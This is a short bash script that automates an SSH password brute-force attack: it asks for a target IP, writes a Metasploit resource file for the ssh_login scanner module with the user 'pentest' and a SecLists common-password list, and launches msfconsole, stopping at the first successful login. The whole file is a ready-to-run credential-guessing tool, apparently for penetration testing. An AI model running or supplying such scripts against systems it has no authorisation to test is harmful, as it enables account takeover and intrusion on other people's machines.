#!/bin/bash

read -p "Enter target IP: " target_ip

# Set the username as 'pentest'
username="pentest"

# Set the password file to the default seclist location in Kali Linux
pass_file="/usr/share/seclists/Passwords/darkweb2017-top100.txt"

cat > ssh_brute.rc <<EOF
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $target_ip
set USERNAME $username
set PASS_FILE $pass_file
set STOP_ON_SUCCESS true
run
exit
EOF

msfconsole -r ssh_brute.rc
